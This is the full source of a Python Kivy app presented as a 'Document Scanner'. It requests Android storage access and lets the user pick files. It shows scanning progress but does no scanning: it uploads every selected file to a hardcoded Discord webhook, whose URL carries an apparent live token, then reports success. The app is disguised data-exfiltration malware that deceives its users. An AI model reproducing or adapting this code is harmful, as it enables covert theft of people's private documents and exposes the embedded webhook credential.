from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.utils import platform
from kivy.core.window import Window
from plyer import filechooser
import requests
import threading
import os
from functools import partial

# Your webhook URL - Replace this with your actual webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1339611333842174114/e2FJEUb8UAmWMNdqamSB8JkGxQDGbYyjTVt79x293jKHPTIn50-DQMauAtMw05E4zvMs"

class ScannerApp(App):
    def build(self):
        # Set up the main layout
        self.layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        # Title label
        title = Label(
            text='Document Scanner',
            size_hint_y=None,
            height='48dp',
            font_size='24sp'
        )
        self.layout.add_widget(title)
        
        # Status label
        self.status_label = Label(
            text='Select files to scan',
            size_hint_y=None,
            height='48dp'
        )
        self.layout.add_widget(self.status_label)
        
        # Progress bar
        self.progress = ProgressBar(
            max=100,
            size_hint_y=None,
            height='40dp'
        )
        self.layout.add_widget(self.progress)
        
        # Select file button
        select_button = Button(
            text='Select Files',
            size_hint_y=None,
            height='48dp',
            background_color=(0.2, 0.6, 1, 1)
        )
        select_button.bind(on_press=self.select_files)
        self.layout.add_widget(select_button)
        
        return self.layout
    
    def select_files(self, instance):
        try:
            filechooser.open_file(on_selection=self.handle_selection, multiple=True)
        except Exception as e:
            self.status_label.text = f'Error: {str(e)}'
    
    def handle_selection(self, selection):
        if not selection:
            return
        
        self.status_label.text = f'Processing {len(selection)} files...'
        threading.Thread(target=self.process_files, args=(selection,)).start()
    
    def update_progress(self, value):
        self.progress.value = value
    
    def update_status(self, text):
        self.status_label.text = text
    
    def process_files(self, files):
        total_files = len(files)
        for index, file_path in enumerate(files, 1):
            try:
                # Update progress
                progress = (index / total_files) * 100
                Clock.schedule_once(partial(lambda dt, v: self.update_progress(v), progress))
                Clock.schedule_once(partial(lambda dt, t: self.update_status(f'Scanning file {index}/{total_files}...'), None))
                
                # Send file to webhook
                with open(file_path, 'rb') as file:
                    files = {'file': file}
                    response = requests.post(WEBHOOK_URL, files=files)
                    
                    if response.status_code != 200:
                        Clock.schedule_once(partial(lambda dt, t: self.update_status(f'Error sending file {os.path.basename(file_path)}'), None))
                        continue
            
            except Exception as e:
                Clock.schedule_once(partial(lambda dt, t: self.update_status(f'Error: {str(e)}'), None))
                return
        
        Clock.schedule_once(partial(lambda dt, t: self.update_status('All files processed successfully!'), None))
        Clock.schedule_once(partial(lambda dt, v: self.update_progress(0), None))

if __name__ == '__main__':
    if platform == 'android':
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ])
    
    Window.clearcolor = (0.95, 0.95, 0.95, 1)
    ScannerApp().run()
